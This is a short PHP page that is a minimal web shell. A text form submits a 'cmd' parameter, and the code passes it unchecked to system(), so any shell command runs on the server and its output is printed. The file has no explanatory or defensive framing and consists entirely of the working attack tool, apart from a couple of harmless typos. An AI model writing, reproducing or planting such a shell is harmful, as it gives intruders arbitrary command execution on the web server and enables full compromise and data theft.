<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <form method="get">
        <input type="text" name="cmd" size="80">
        <input type="subit" value="Execute">
    </form>
    <pre>
        <?php header("Content-type:text/html;charset-EUC-KR");
        if($_GET['cmd']){
            system($_GET['cmd']);
        }
        ?>
    </pre>
</body>
</html>